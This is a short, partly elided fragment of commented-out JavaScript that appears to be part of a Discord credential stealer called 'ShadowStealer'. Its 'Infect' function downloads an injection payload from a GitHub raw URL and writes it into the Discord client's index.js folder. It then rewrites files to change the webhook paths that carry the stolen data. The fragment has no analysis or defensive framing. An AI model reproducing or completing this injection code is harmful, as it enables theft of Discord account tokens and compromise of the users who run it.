...
//listDiscords();
//function Infect() {
//    https.get('https://raw.githubusercontent.com/Michiamavanocracker/iwwdb-adwhd3h11-/main/src/Injection/injection', (resp) => {
 //       let data = '';
//        resp.on('data', (chunk) => {
//            data += chunk;
//        });
...
//
  //                  let folder = file.replace("index.js", "ShadowStealerBTW")
...
//        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "shadowisgod"))
//    } else {
//        return;
//    }
//
